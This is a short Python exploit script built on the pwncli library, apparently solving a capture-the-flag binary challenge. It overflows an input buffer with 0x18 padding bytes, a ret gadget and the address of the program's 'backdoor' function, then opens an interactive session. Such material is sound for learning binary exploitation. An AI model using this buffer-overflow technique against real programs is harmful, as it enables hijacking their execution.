#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io'] 
elf: ELF = gift['elf']
libc: ELF = gift['libc']
stop(0)
# get gadgets from current file
ret = CurrentGadgets.ret()

io.sendafter("read your name: ", "roderick")
stop(0)
# to execute backdoor
io.sendafter("please input: ", b"a"*0x18 + p64(ret) + p64(elf.sym.backdoor))

ia()
